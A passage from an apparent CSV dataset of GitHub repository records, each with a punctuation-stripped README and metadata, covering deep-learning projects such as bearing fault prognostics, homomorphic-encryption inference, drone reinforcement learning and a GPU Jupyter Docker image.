springer com article 10 1007 2Fs11465 018 0472 3 El Thalji I and E Jantunen A summary of fault modelling and predictive health monitoring of rolling element bearings Mechanical Systems and Signal Processing 2015 60 61 p 252 272 link https www sciencedirect com science article pii S0888327015000813 via 3Dihub Cerrada M et al A review on data driven fault severity assessment in rolling bearings Mechanical Systems and Signal Processing 2018 99 p 169 196 link https www sciencedirect com science article pii S0888327017303242 Zhang S et al Machine Learning and Deep Learning Algorithms for Bearing Fault Diagnostics A Comprehensive Review arXiv preprint arXiv 1901 08247 2019 link https arxiv org abs 1901 08247 Yan R et al Knowledge Transfer for Rotary Machine Fault Diagnosis IEEE Sensors Journal p 1 1 link https ieeexplore ieee org document 8880697 Lei Y et al Machinery health prognostics A systematic review from data acquisition to RUL prediction Mechanical Systems and Signal Processing 2018 104 p 799 834 link https www sciencedirect com science article pii S0888327017305988 Original research papers Fault diagnosis doc FD md Trend prediction doc TD md Remaining useful life prediction doc RULP md Open source projects Algorithm recurrence of two highly cited papers https github com AiZhanghan deep learning fault diagnosis to prediction the remain useful life of bearing based on 2012 PHM data https github com ddrrrr projectRUL Remaining Useful Life Prediction Using RNN LSTM GRU Neural Networks https github com lankuohsing Remaining Useful Life Prediction RNN Convolutional Recurrent Neural Networks for Remaining Useful Life Prediction in Mechanical Systems https github com nicolasoyharcabal ConvRNNforRULestimation NASA Prognostics Algorithm Library https github com nasa PrognosticsAlgorithmLibrary Research teams,2019-11-01T07:17:56Z,2019-12-14T16:06:26Z,n/a,hustcxl,User,2,6,2,21,master,hustcxl,1,0,0,0,0,0,0
RodolfoFerro,CIMPS2019,n/a,DLaaS media banner png GitHub last commit https img shields io github last commit RodolfoFerro CIMPS2019 style for the badge Code size https img shields io github languages code size RodolfoFerro CIMPS2019 style for the badge GitHub https img shields io github license RodolfoFerro CIMPS2019 style for the badge Slides https img shields io static v1 label Slides message Google 20Slides color tomato style for the badge https docs google com presentation d e 2PACX 1vQu3NcX5En0X4fd65 jziWHvPmkU1tUNQurw3lAgfcEHNwtmsaLg4zrE5AKwkYb0cshCXM0p55Is47p pub start false loop false delayms 3000 Contenido del taller El taller fue originalmente desarrollado para su uso durante la Escuela de Verano de la RIIAA 2 0 y ha sido adaptado para el CIMPS 2019 El material debe estar autocontenido lo que significa que con este documento explicativo debe bastar para poder seguir y desarrollar el contenido del taller Grosso modo el contenido cubierto a lo largo del taller es el siguiente Motivacin Requisitos y setup Intro al mundo del Deep Learning Funcionamiento de APIs Requests Consumo de APIs con Python Flask Microframework web de Python Cmo servimos modelos de IA Puedes encontrar los slides en vivo AQU https docs google com presentation d e 2PACX 1vQu3NcX5En0X4fd65 jziWHvPmkU1tUNQurw3lAgfcEHNwtmsaLg4zrE5AKwkYb0cshCXM0p55Is47p pub start false loop false delayms 3000 Es importante mencionar que el curso har uso de un ambiente en la nube y uno local para el desarrollo del material por lo que te recomendamos apoyarte de los ayudantes del curso para la instalacin de Pythony todos los requerimientos Instrucciones para estudiantes La mayora de las prcticas de los talleres se desarrollarn en Python 3 7 usando la biblioteca Tensorflow 2 0 https www tensorflow org que adopta Keras https www tensorflow org versions r2 0 apidocs python tf keras como interfaz de alto nivel para construir y entrenar redes neuronales Requerimientos Una laptop Este repositorio de GitHub clonado y actualizado antes del taller Un sentido aventurero en los datos Un ambiente Python 3 7 con Anaconda ver opciones 1 y 2 abajo Los talleres sern impartidos usando notebooks de Jupyter documentos con cdigo ejecutable texto ecuaciones visualizaciones imgenes y dems material Los notebooks se pueden crear y ejecutar en la nube va Google Colab opcin 1 o de manera local en tu computadora a travs de Jupyter Notebooks o JupyterLab https jupyter org opcin 2 Opcion 1 Google Colab Colab https colab research google com es un servicio de Google para ejecutar notebooks en la nube Provee ambientes de Python 2 y 3 con CPUs GPUs y TPUs Y es gratis Solo necesitas tener una cuenta de Google o crear una Recomendamos que elijas un ambiente con Python 3 y GPU Para activarlo Abre el men Entorno de ejecucin Elige la opcin Restablecer todos los entornos de ejecucin Vuelve a abrir Entorno de ejecucin Elige Cambiar tipo de entorno de ejecucin Selecciona Python 3 como Tipo de ejecucin y GPU de la lista de Acelerador por hardware La siguiente captura de pantalla ilustra este proceso media escogeacelerador png En Colab https colab research google com puedes crear un nuevo notebook subir uno existente desde tu computadora o importarlo de Google Drive o GitHub Opcion 2 Ambiente local Para tener la versin de Python 3 7 aadido Python al PATH y todas las bibliotecas instaladas en cualquier plataforma recomendamos que uses Anaconda https www anaconda com y generes un ambiente con el archivo environment yml de este repositorio usando una terminal y el comando bash conda env create n riiaa19 f environment yml Cambia el nombre riia19 por tu nombre favorito para el ambiente o puedes remover la bandera n riia19 para dejar el nombre default del ambiente DLaaS Para activar el ambiente que creaste en una terminal ingresa el comando bash conda activate riiaa19 O en su defecto conda activate DLaaS Una vez activado puedes ejecutar la aplicacin de Jupyter Notebook bash jupyter notebook O de JupyterLab bash jupyter lab Este ltimo comando abrir una pestaa o ventana en tu navegador web como se muestra en la siguiente captura de pantalla media jupyterlab png Al igual que en Google Colab puedes crear un nuevo notebook seleccionando el botn New y posteriormente Python 3 De forma alternativa puedes abrir uno existente seleccionando el archivo del notebook con extensin ipynb dentro del directorio donde ejecutaste Jupyter Notebook Con el botn Upload agregas archivos que se encuentran en otra parte de tu computadora a este directorio Para cerrar Jupyter Notebook presiona el botn Quit y posteriormente cierra la pestaa o ventana de tu navegador web Para desactivar el ambiente riiaa19 de Anaconda simplemente haz conda deactivate Atribuciones Este repositorio cuenta con una MIT License https github com RodolfoFerro RIIAA19 DLaaS blob master LICENSE Los conos creados por DinosoftLabs https www flaticon com authors dinosoftlabs y Flat Icons https www flaticon com authors flat icons de cuentan con una licencia CC 3 0 BY http creativecommons org licenses by 3 0,2019-10-24T14:05:59Z,2019-11-04T22:04:42Z,Jupyter Notebook,RodolfoFerro,User,1,6,5,2,master,RodolfoFerro,1,0,0,0,0,0,0
xuanlinli17,CS285_Fa19_Deep_Reinforcement_Learning,n/a,Fall 2019 Deep Reinforcement Learning Berkeley CS285 prev CS294 112 My solutions to CS285 originally CS294 112 Fall 2019 assignments Course Website http rail eecs berkeley edu deeprlcourse Each folder contains original hw pdf code experiment data and plotter file See the instructions txt of each folder for specific setup instructions and README md of each folder for experiment instructions HW1 HW5 have been uploaded,2019-10-09T20:59:12Z,2019-12-15T02:15:20Z,Python,xuanlinli17,User,1,6,2,11,master,xuanlinli17,1,0,0,2,1,2,2
uncbiag,DeepAtlas,image-registration#image-segmentation#medical-image-analysis#semi-supervised-learning,DeepAtlas This is the repository for the paper DeepAtlas Joint Semi Supervised Learning of Image Registration and Segmentation at MICCAI 2019 https doi org 10 1007 978 3 030 32245 847 arxiv https arxiv org abs 1904 08465 by Zhenlin Xu and Marc Niethammer The code is coming soon,2019-10-08T21:21:41Z,2019-11-11T02:13:43Z,Python,uncbiag,Organization,4,6,0,3,master,wildphoton,1,0,0,0,0,0,0
guyulongcs,Deep-Reinforcement-Learning-for-Recommender-Systems,n/a,Deep Reinforcement Learning for Recommender Systems Papers DQN WWW 18 DRN A Deep Reinforcement Learning Framework for News Recommendation paper https dl acm org citation cfm id 3185994 star Microsoft KDD 18 Stabilizing Reinforcement Learning in Dynamic Environment with Application to Online Recommendation paper https dl acm org citation cfm id 3220122 star Alibaba IJCAI 19 Reinforcement Learning for Slate based Recommender Systems A Tractable Decomposition and Practical Methodology paper https www cs toronto edu cebly Papers SlateQIJCAI2019 pdf arxiv https arxiv org abs 1905 12767 star Google ICML 19 Off Policy Deep Reinforcement Learning without Exploration paper http proceedings mlr press v97 fujimoto19a fujimoto19a pdf Policy Gradient WSDM 19 Top K Off Policy Correction for a REINFORCE Recommender System paper https dl acm org citation cfm id 3290999 star Google NIPS 17 Off policy evaluation for slate recommendation paper http papers nips cc paper 6954 off policy evaluation for slate recommendation pdf ICML 19 Safe Policy Improvement with Baseline Bootstrapping paper http proceedings mlr press v97 laroche19a laroche19a pdf WWW 19 Policy Gradients for Contextual Recommendations paper https dl acm org citation cfm id 3313616 AAAI 19 Large scale Interactive Recommendation with Tree structured Policy Gradient paper https wvvw aaai org ojs index php AAAI article view 4204 Actor Critic Arxiv 15 Deep Reinforcement Learning in Large Discrete Action Spaces paper https arxiv org abs 1512 07679 code https github com jimkon Deep Reinforcement Learning in Large Discrete Action Spaces Arxiv 18 Deep Reinforcement Learning based Recommendation with Explicit User Item Interactions Modeling paper https arxiv org abs 1810 12027 KDD 18 Supervised Reinforcement Learning with Recurrent Neural Network for Dynamic Treatment Recommendation paper https dl acm org citation cfm id 3219961 Post Rank WWW 19 Value aware Recommendation based on Reinforcement Profit Maximization paper https dl acm org citation cfm id 3313404 code https github com rec agent rec rl Dataset https drive google com file d 14OtIC8eiDkzoWCTtaUZHcb7eB bUmtTT view star Alibaba Top K KDD 19 Exact K Recommendation via Maximal Clique Optimization paper https dl acm org citation cfm id 3292500 3330832 star Alibaba Bandit WWW 10 A Contextual Bandit Approach to Personalized News Article Recommendation paper https dl acm org citation cfm id 1772758 KDD 16 Online Context Aware Recommendation with Time Varying Multi Armed Bandit paper https dl acm org citation cfm id 2939878 CIKM 17 Returning is Believing Optimizing Long term User Engagement in Recommender Systems ICLR 18 Deep Learning with Logged Bandit Feedback paper https dl acm org citation cfm id 3133025 Recsys 18 Explore Exploit and Explain Personalizing Explainable Recommendations with Bandits paper https dl acm org citation cfm id 3240354 Multi agent WWW 18 Learning to Collaborate Multi Scenario Ranking via Multi Agent Reinforcement Learning paper https dl acm org citation cfm id 3186165 star Alibaba Hierarchical RL AAAI19 Hierarchical Reinforcement Learning for Course Recommendation in MOOCs paper https xiaojingzi github io publications AAAI19 zhang et al HRL pdf WWW 19 Aggregating E commerce Search Results from Heterogeneous Sources via Hierarchical Reinforcement Learning paper https dl acm org citation cfm id 3313455 star Alibaba Offline WSDM 19 Offline Evaluation to Make Decisions About Playlist Recommendation Algorithms paper https dl acm org citation cfm id 3291027 KDD 19 Off policy Learning for Multiple Loggers paper https dl acm org citation cfm id 3330864 Explainable ICDM 18 A Reinforcement Learning Framework for Explainable Recommendation paper https www microsoft com en us research uploads prod 2018 08 main pdf SIGIR 19 Reinforcement Knowledge Graph Reasoning for Explainable Recommendation paper https dl acm org citation cfm id 3331203 Search Engine KDD 18 Reinforcement Learning to Rank in E Commerce Search Engine Formalization Analysis and Application paper https dl acm org citation cfm id 3219846 star Alibaba Simulation ICML 19 Generative Adversarial User Model for Reinforcement Learning Based Recommendation System paper http proceedings mlr press v97 chen19f html JD com JD Data Science Lab https datascience jd com page publications html Dawei Yin https www yindawei com Xiangyu Zhao https www cse msu edu zhaoxi35 KDD 19 Reinforcement Learning to Optimize Long term User Engagement in Recommender Systems paper https dl acm org citation cfm id 3330668 star JD DSFAA 19 Reinforcement Learning to Diversify Top N Recommendation paper https link springer com chapter 10 1007 978 3 030 18579 47 code https github com zoulixin93 FMCTS star JD KDD 18 Recommendations with Negative Feedback via Pairwise Deep Reinforcement Learning paper https dl acm org citation cfm id 3219886 star JD RecSys 18 Deep Reinforcement Learning for Page wise Recommendations paper https dl acm org citation cfm id 3240374 star JD DRL4KDD Deep Reinforcement Learning for List wise Recommendations paper https arxiv org abs 1801 00209 star JD Sigweb 19 Deep Reinforcement Learning for Search Recommendation and Online Advertising A Survey paper https dl acm org citation cfm id 3320500 star JD Arxiv 19 Model Based Reinforcement Learning for Whole Chain Recommendations paper https arxiv org abs 1902 03987 star JD Arxiv 19 Simulating User Feedback for Reinforcement Learning Based Recommendations paper https arxiv org abs 1906 11462 star JD Arxiv 19 Deep Reinforcement Learning for Online Advertising in Recommender Systems paper https arxiv org abs 1909 03602,2019-09-28T06:09:31Z,2019-12-12T11:52:31Z,n/a,guyulongcs,User,1,6,1,10,master,guyulongcs,1,0,0,0,0,0,0
jimthompson5802,ludwig_examples,deep-learning#uber-ludwig,Uber ludwig examples Example code illustrating using Uber s ludwig https uber github io ludwig deep learning framework Objectives Define Docker images for the Ludwig software stack including both Tensorflow cpu enabled and Tensorflow gpu enabled Demonstrate running ludwig using command line execution in a Docker container Demonstrate running ludwig using Python api in a Docker container Generate modeling assessment visualizations e g learning curves confusion matrix etc Provide samples for various types of models image classification text analytics sentiment analysis time series forecasting etc Repo Contents Directory Description bin bash scripts for various function containers Docker containers for ludwig software stack kaggletitanic Kaggle Titanic predictive competition data set mnist Use of ludwig with mnist data set textclassification Text classification model timeseries Time series forecasting temperature Preparatory steps Create docker images with ludwig software stack Run the following bash script bin buildimages tfcpu bin buildimages tfgpu Conceptual View images dockercontainers png,2019-10-20T00:08:32Z,2019-12-12T18:12:56Z,Shell,jimthompson5802,User,1,6,0,112,master,jimthompson5802,1,0,0,0,0,0,0
suriyadeepan,PyroDemystified-PyCon2019,n/a,PyroDemystified PyCon 2019 bash python3 m pip install requirements txt pytest tests edit main block in main py before execution python3 main py,2019-10-14T01:05:17Z,2019-12-13T22:15:38Z,Jupyter Notebook,suriyadeepan,User,1,6,0,9,master,suriyadeepan,1,0,0,0,0,0,0
IntelAI,he-transformer,n/a,HE Transformer for nGraph The Intel HE transformer for nGraph is a Homomorphic Encryption HE backend to the Intel nGraph Compiler https github com NervanaSystems ngraph Intel s graph compiler for Artificial Neural Networks Homomorphic encryption is a form of encryption that allows computation on encrypted data and is an attractive remedy to increasing concerns about data privacy in the field of machine learning For more information see our original paper https arxiv org pdf 1810 10121 pdf Our updated paper https arxiv org pdf 1908 04172 pdf showcases many of the recent advances in he transformer This project is meant as a proof of concept to demonstrate the feasibility of HE on local machines The goal is to measure performance of various HE schemes for deep learning This is not intended to be a production ready product but rather a research tool Currently we support the CKKS https eprint iacr org 2018 931 pdf encryption scheme implemented by the Simple Encrypted Arithmetic Library SEAL https github com Microsoft SEAL from Microsoft Research Additionally we integrate with the Intel nGraph Compiler and runtime engine for TensorFlow https github com tensorflow ngraph bridge to allow users to run inference on trained neural networks through Tensorflow Examples The examples https github com NervanaSystems he transformer tree master examples folder contains a deep learning example which depends on the Intel nGraph Compiler and runtime engine for TensorFlow https github com tensorflow ngraph bridge Building HE Transformer Dependencies Operating system Ubuntu 16 04 Ubuntu 18 04 CMake 3 12 Compiler g version 6 0 clang 5 0 OpenMP is strongly suggested though not strictly necessary You may experience slow runtimes without OpenMP python3 and pip3 virtualenv v16 1 0 bazel v0 25 2 For a full list of dependencies see the docker containers https github com NervanaSystems he transformer tree master contrib docker which build he transformer on a reference OS The following dependencies are built automatically nGraph https github com NervanaSystems ngraph v0 27 0 rc 0 nGraph tf https github com tensorflow ngraph bridge v0 21 0 rc0 SEAL https github com Microsoft SEAL v3 4 5 TensorFlow https github com tensorflow tensorflow v1 14 0 Boost https github com boostorg v1 69 Google protobuf https github com protocolbuffers protobuf v3 10 1 To install bazel bash wget https github com bazelbuild bazel releases download 0 25 2 bazel 0 25 2 installer linux x8664 sh bash bazel 0 25 2 installer linux x8664 sh user Add and source the bin path to your bashrc file to call bazel bash export PATH PATH bin source bashrc 1 Build HE Transformer Before building make sure you deactivate any active virtual environments i e run deactivate bash git clone https github com NervanaSystems he transformer git cd he transformer export HETRANSFORMER pwd mkdir build cd HETRANSFORMER build cmake DCMAKECXXCOMPILER clang 6 0 Note you may need sudo permissions to install hesealbackend to the default location To set a custom installation prefix add the DCMAKEINSTALLPREFIX myinstallprefix flag to the above cmake command See 1a and 1b for additional configuration options To install run the below command note this may take several hours To speed up compilation with multiple threads call make j install bash make install 1a Multi party computation MPC with garbled circuits GC To enable an integration with an experimental multi party computation backend using garbled circuits via ABY https github com encryptogroup ABY call bash cmake DNGRAPHHEABYENABLE ON Note this feature is experimental and may suffer from performance and memory issues To use this feature build python bindings for the client and see 3 python examples 1b To build documentation First install the additional required dependencies bash sudo apt get install doxygen graphviz Then add the following CMake flag bash cmake DNGRAPHHEDOCBUILDENABLE ON and call bash make docs to create doxygen documentation in HETRANSFORMER build doc doxygen 1c Python bindings for client To build a client server model with python bindings recommended for running neural networks through TensorFlow bash cd HETRANSFORMER build source external venv tf py3 bin activate make install pythonclient This will create python dist pyheclient whl Install it using bash pip install python dist pyheclient whl To check the installation worked correctly run bash python3 c import pyheclient This should run without errors 2 Run C unit tests bash cd HETRANSFORMER build To run single HESEAL unit test test unit test gtestfilter HESEAL add23cipherplainrealunpackedunpacked To run all C unit tests test unit test 3 Run python examples See examples README md https github com NervanaSystems he transformer tree master examples README md for examples of running he transformer for deep learning inference on encrypted data Code formatting Please run maint apply code format sh before submitting a pull request,2019-09-24T22:14:20Z,2019-12-13T06:11:20Z,C++,IntelAI,Organization,5,6,1,249,master,fboemer#yxlao#lorepieri8#lnguyen-nvn#jopasserat#mlayou#r-kellerm#rsandler00,8,0,0,0,0,0,10
khornlund,cookiecutter-pytorch,cookiecutter-template#deep-learning#python#pytorch,Cookiecutter Pytorch Template A Cookiecutter template for PyTorch projects contents Table of Contents depth 2 Requirements Python 3 7 PyTorch 1 1 Tensorboard 1 4 Features Clear folder structure which is suitable for many deep learning projects Runs are configured via yml files allowing for easy experimentation Checkpoint saving and resuming Tensorboard logging Usage code pip install cookiecutter cookiecutter https github com khornlund cookiecutter pytorch cd path to repo A template project has now been created You can run the MNIST example using code conda env create file environment yml conda activate train Example Projects Here are some projects which use this template 1 Severstal Steel Defect Detection Kaggle 2 Aptos Blindness Detection Kaggle Custom Defaults If you fork this repo you can modify cookiecutter json to provide personalised defaults eg name email username etc Acknowledgements This template was based on PyTorch Template,2019-10-26T11:39:49Z,2019-11-23T00:41:10Z,Python,khornlund,User,1,5,3,3,master,khornlund,1,0,0,0,0,0,0
aqeelanwar,DRLwithTL,airsim#deep-reinforcement-learning#unreal-engine,Deep Reinforcement Learning with Transfer Learning Simulated Drone and Environment DRLwithTL Sim What is DRLwithTL Sim This repository uses Transfer Learning TL based approach to reduce on board computation required to train a deep neural network for autonomous navigation via Deep Reinforcement Learning for a target algorithmic performance A library of 3D realistic meta environments is manually designed using Unreal Gaming Engine and the network is trained end to end These trained meta weights are then used as initializers to the network in a simulated test environment and fine tuned for the last few fully connected layers Variation in drone dynamics and environmental characteristics is carried out to show robustness of the approach The repository containing the code for real environment on a real DJI Tello drone can be found DRLwithTL Real https github com aqeelanwar DRLwithTLreal Cover Photo images cover png Cover Photo images envs png Installing DRLwithTL Sim The current version of DRLwithTL Sim supports Windows and requires python3 Its advisable to make a new virtual environment https towardsdatascience com setting up python platform for machine learning projects cfd85682c54b for this project and install the dependencies Following steps can be taken to download get started with DRLwithTL Sim Clone the repository git clone https github com aqeelanwar DRLwithTL git Download imagenet weights for AlexNet The DQN uses Imagenet learned weights for AlexNet to initialize the layers Following link can be used to download the imagenet npy file Download imagenet npy https drive google com open id 1Ei4mCzjfLY5ql6ILIUHaCtAR2XF6BtAM Once downloaded place it in models imagenet npy Install required packages The provided requirements txt file can be used to install all the required packages Use the following command cd DRLwithTL pip install r requirements txt This will install the required packages in the activated python environment Install Epic Unreal Engine You can follow the guidelines in the link below to install Unreal Engine on your platform Instructions on installing Unreal engine https docs unrealengine com en US GettingStarted Installation index html Install AirSim AirSim is an open source plugin for Unreal Engine developed by Microsoft for agents drones and cars with physically and visually realistic simulations In order to interface between Python3 and the simulated environment AirSim needs to be installed It can be downloaded from the link below Instructions on installing AirSim https github com microsoft airsim Running DRLwithTL Sim Once you have the required packages and software downloaded and running you can take the following steps to run the code Create Download a simulated environment You can either manually create your environment using Unreal Engine or can download one of the sample environments from the link below and run it Download Environments https drive google com open id 1u5teth6l4JW2IXAkZAg1CbDGR6zE v6Z Following environments are available for download from the link above Indoor Long Environment Indoor Twist Environment Indoor VanLeer Environment Indoor Techno Environment Indoor Pyramid Environment Indoor FrogEyes Environment The link above will help you download the packaged version of the environment for 64 bit windows Run the executable file exe to start the environment Edit the configuration file Optional The RL parameters for the DRL simulation can be set using the provided config file and are self explanatory The details on the parameters in the config file can be found here https towardsdatascience com deep reinforcement learning for drones in 3d realistic environments 36821b6ee077 cd DRLwithTLconfigs notepad config cfg for windows Run the Python code The DRL code can be started using the following command cd DRLwithTL python main py While the simulation is running RL parameters such as epsilon learning rate average Q values and loss can be viewed on the tensorboard The path depends on the envtype envname and traintype set in the config file and is given by models trained ltenvtype ltenvname Imagenet An example can be seen below cd modelstrainedIndoorindoorlongImagenet tensorboard logdir e2e Citing If you find this repository useful for your research please use the following bibtex citations ARTICLE2019arXiv191005547A author Anwar Aqeel and Raychowdhury Arijit title Autonomous Navigation via Deep Reinforcement Learning for Resource Constraint Edge Nodes using Transfer Learning journal arXiv e prints keywords Computer Science Machine Learning Statistics Machine Learning year 2019 month Oct eid arXiv 1910 05547 pages arXiv 1910 05547 archivePrefix arXiv eprint 1910 05547 primaryClass cs LG adsurl https ui adsabs harvard edu abs 2019arXiv191005547A adsnote Provided by the SAO NASA Astrophysics Data System articleyoon2019hierarchical title Hierarchical Memory System With STT MRAM and SRAM to Support Transfer and Real Time Reinforcement Learning in Autonomous Drones author Yoon Insik and Anwar Malik Aqeel and Joshi Rajiv V and Rakshit Titash and Raychowdhury Arijit journal IEEE Journal on Emerging and Selected Topics in Circuits and Systems volume 9 number 3 pages 485 497 year 2019 publisher IEEE Authors Aqeel Anwar https www prism gatech edu manwar8 Georgia Institute of Technology License This project is licensed under the MIT License see the LICENSE md LICENSE file for details,2019-10-14T21:04:02Z,2019-12-12T04:57:10Z,Python,aqeelanwar,User,3,5,3,3,master,aqeelanwar,1,0,0,0,0,0,0
NosenLiu,Dota2_data_analysis,n/a,Dota2dataanalysis DOTA2 data modeling by deep learning method 2019 10 31 First upload code getgamesBYidwritefile py This is the code to download gaming data from OpenDota API code trainmodel py The the code for modeling and training data The path to save gaming data model The path to save deep learning models,2019-10-31T10:07:31Z,2019-12-03T07:08:18Z,Python,NosenLiu,User,1,5,2,5,master,NosenLiu,1,0,0,0,0,0,0
muhammet-mucahit,Deep-Learning-with-Pytorch,n/a,Deep Learning with Pytorch Intro to Deep Learning with PyTorch,2019-10-04T22:35:38Z,2019-11-12T20:47:26Z,Jupyter Notebook,muhammet-mucahit,User,1,5,0,23,master,muhammet-mucahit,1,0,0,0,0,0,0
jjpd777,meetup-applied-deep-learning,n/a,Applied Deep Learning MeetUp This is a repository to keep track of the exercises used for the Applied Deep Learning MeetUp in Medelln Most of the code examples will come directly from Dr Adrian Rosebrock s tutorials on deep learning https upload wikimedia org wikipedia commons 6 6b MeetupLogo png,2019-10-01T19:48:46Z,2019-11-12T04:48:30Z,Python,jjpd777,User,1,5,0,65,master,jjpd777,1,0,0,0,0,0,0
Mehdi0xC,PathFinding-Agent-with-Deep-Reinforcement-Learning,n/a,PathFinding Agent with Deep Reinforcement Learning This project was done as a part of my B Sc Thesis under supervision of Dr Mehdi Sedighi Computer Engineering Department Tehran Polytechnic The aim was to implement a reinforcement learning algorithm to train a pathfinding agent to follow the path it s intended to follow I ve defined the project to be as follow 1 The algorithm to be implemented is the famouse DQN algorithm introduced in this paper 2 The implementation should be done in a virtual simulation environment using python language Step 1 The first step was to design a simulation environment Kivy framework is used for this purpose An agent with seven sensors adjustable starts in a specific position on a white field the user can draw lines on the field and the agent is able to percept those lines with its sensors Simulation Environment img featured jpg Simulation Environment Step 2 Pytorch library is used for highlevel implementation of DQN For better exploration epsillon greedy method is used Hyperparameters were obtained as follow 1 learningrate 0 001 2 input layer neurons 7 3 output layer neurons 3 corresponding to three different movements 4 hidden layer neurons 10 5 activation function for neurons ReLU 6 gamma 0 9 7 reward 0 1 8 punishment negative reward 1 9 epsillon greedy iterations 2500 10 epsillon greedy initial probability 0 5 Step 3 Implementation is done with fully numpy framework with object oriented methodology Block Diagram img img0 jpg Block Diagram Step 4 Added a config py file to have control on simulation It would be as follow python learningCoreSettings Number of hidden layer neurons For three inputs 8 to 16 neurons work like charm nNeurons 10 Discount factor Somewhere between 0 8 and 0 9 is ok gamma 0 9 Replay memory capacity 10000 is more than enough memoryCapacity 10000 Learning rate Somewhere between 0 0001 to 0 005 is ok learningRate 0 001 BatchSize number of samples taken from replay memory in each Learning Iteration batchSize 25 Non linear activation function for neurons ReLU is used in this project but you may implement others activationFunction relu Number of outputs can be set to 3 Its not generic yet nOutputs 3 Number of inputs can be set to 3 or 7 Its not generic yet nInputs 3 Regularization factor for now its just implemented in manual design reg 0 AI Backend can be set to manual pytorch backend manual Amount of given reward for DQN algorithm rewardAmount 0 1 Punishment amount of given negative reward for DQN algorithm punishAmount 1 Softmax temperature used in softmax function implementation softmaxTemperature 10 Number of iterations in learning phase learningIterations 2500 Number of iterations in prediction phase predictionIterations 2500 environmentSettings sensorSize 15 agentWidth 96 agentLength 120 rotationDegree 3 agentVelocity 5 sensorsRotationalDistance 15 sensorSensitivity 8 buttonWidth 230 environmentWidth 800 environmentHeight 600 Conclusion The robot exhibited as expected We executed it for 5000 iterations 2500 iterations for exploration phase based on epsillon greedy method and another 2500 iterations for prediction phase which we stopped the learning and fixed the MLP weights Here we provided a video showing its functionality This is a experimental project suitable for testing and working with small scale reinforcement learning tasks which can be used in experimenting different algorithms for autonomous systems,2019-10-17T10:53:47Z,2019-12-07T18:49:57Z,Python,Mehdi0xC,User,1,5,0,26,master,Mehdi0xC,1,0,0,0,0,0,0
SoucheLab,TensorFlow2-Examples,n/a,TensorFlow2 Examples Some deep learning examples implemented by TensorFlow2 TensorFlow2 1 TensorFlow 2 0 https tf wiki,2019-10-24T14:10:05Z,2019-11-19T08:04:53Z,Python,SoucheLab,Organization,2,5,0,12,master,enningxie,1,0,0,0,0,0,0
timesler,docker-jupyter-dl-gpu,n/a,docker jupyter dl gpu Build Status https github com timesler docker jupyter dl gpu workflows docker build badge svg GPU enabled docker image for deep learning The image provides a complete environment for deep learning in pytorch including ipython conda cuda pytorch torchvision tensorboard numpy pandas scipy matplotlib seaborn and many more see below for a full package list This image is fully compatible as the user image for a JupyterHub deployment Prerequisites docker optional nvidia docker required to run on GPU Usage Jupyter bash docker run rm p 8888 8888 v home jovyan timesler jupyter dl gpu latest Jupyter lab bash docker run rm p 8888 8888 v home jovyan timesler jupyter dl gpu latest jupyter lab IPython bash docker run rm p 8888 8888 v home jovyan timesler jupyter dl gpu latest ipython Bash bash docker run rm p 8888 8888 v home jovyan timesler jupyter dl gpu latest bash Depending on your system s configuration you may need to call nvidia docker instead of docker or specify nvidia as the docker runtime Complete package list Below is a complete list of conda packages installed in the image Name Version Build Channel libgccmutex 0 1 main defaults alembic 1 2 0 py0 conda forge asn1crypto 0 24 0 py371003 conda forge asyncgenerator 1 10 py0 conda forge attrs 19 1 0 py0 conda forge backcall 0 1 0 py0 conda forge beautifulsoup4 4 8 0 py370 conda forge blas 2 12 openblas conda forge bleach 3 1 0 py0 conda forge blinker 1 4 py1 conda forge bokeh 1 3 4 py370 conda forge bzip2 1 0 8 h516909a1 conda forge ca certificates 2019 9 11 hecc54880 conda forge certifi 2019 9 11 py370 conda forge certipy 0 1 3 py0 conda forge cffi 1 12 3 py37h80227110 conda forge chardet 3 0 4 py371003 conda forge click 7 0 py0 conda forge cloudpickle 1 2 2 py0 conda forge conda 4 7 10 py370 conda forge conda package handling 1 6 0 py37h516909a0 conda forge configurable http proxy 4 1 0 node111 conda forge cryptography 2 7 py37h72c5cf50 conda forge cudatoolkit 10 0 130 0 defaults cycler 0 10 0 py1 conda forge cython 0 29 13 py37he1b5a440 conda forge cytoolz 0 10 0 py37h516909a0 conda forge dask 2 2 0 py0 conda forge dask core 2 2 0 py0 conda forge decorator 4 4 0 py0 conda forge defusedxml 0 5 0 py1 conda forge dill 0 3 0 py372 conda forge distributed 2 4 0 py0 conda forge entrypoints 0 3 py371000 conda forge fastcache 1 1 0 py37h516909a0 conda forge freetype 2 10 0 he983fc91 conda forge fsspec 0 5 1 py0 conda forge future 0 17 1 pypi0 pypi gmp 6 1 2 hf484d3e1000 conda forge gmpy2 2 1 0b1 py37h04dde300 conda forge h5py 2 9 0 nompipy37h513d04c1104 conda forge hdf5 1 10 5 nompih3c11f041103 conda forge heapdict 1 0 0 py371000 conda forge icu 64 2 he1b5a441 conda forge idna 2 8 py371000 conda forge imageio 2 5 0 py370 conda forge intel openmp 2019 5 281 defaults ipykernel 5 1 2 py37h5ca1d4c0 conda forge ipython 7 8 0 py37h5ca1d4c0 conda forge ipythongenutils 0 2 0 py1 conda forge ipywidgets 7 5 1 py0 conda forge jedi 0 15 1 py370 conda forge jinja2 2 10 1 py0 conda forge joblib 0 13 2 py0 conda forge jpeg 9c h14c39751001 conda forge json5 0 8 5 py0 conda forge jsonschema 3 0 2 py370 conda forge jupyterclient 5 3 1 py0 conda forge jupytercore 4 4 0 py0 conda forge jupyterhub 1 0 0 py370 conda forge jupyterlab 1 1 3 pyhf63ae980 defaults jupyterlabserver 1 0 6 py0 conda forge kiwisolver 1 1 0 py37hc9558a20 conda forge krb5 1 16 3 h05b26f91001 conda forge libblas 3 8 0 12openblas conda forge libcblas 3 8 0 12openblas conda forge libcurl 7 65 3 hda55be30 conda forge libedit 3 1 20170329 hf8c457e1001 conda forge libffi 3 2 1 he1b5a441006 conda forge libgcc ng 9 1 0 hdf63c600 defaults libgfortran ng 7 3 0 hdf63c600 defaults liblapack 3 8 0 12openblas conda forge liblapacke 3 8 0 12openblas conda forge libopenblas 0 3 7 h6e990d71 conda forge libpng 1 6 37 hed695b00 conda forge libprotobuf 3 9 2 h8b125970 conda forge libsodium 1 0 17 h516909a0 conda forge libssh2 1 8 2 h22169c72 conda forge libstdcxx ng 9 1 0 hdf63c600 defaults libtiff 4 0 10 h57b87991003 conda forge llvmlite 0 29 0 py37hfd453ef1 conda forge locket 0 2 0 py2 conda forge lz4 c 1 8 3 he1b5a441001 conda forge mako 1 1 0 py0 conda forge markdown 3 1 1 py0 conda forge markupsafe 1 1 1 py37h14c39750 conda forge matplotlib base 3 1 1 py37he7580a81 conda forge 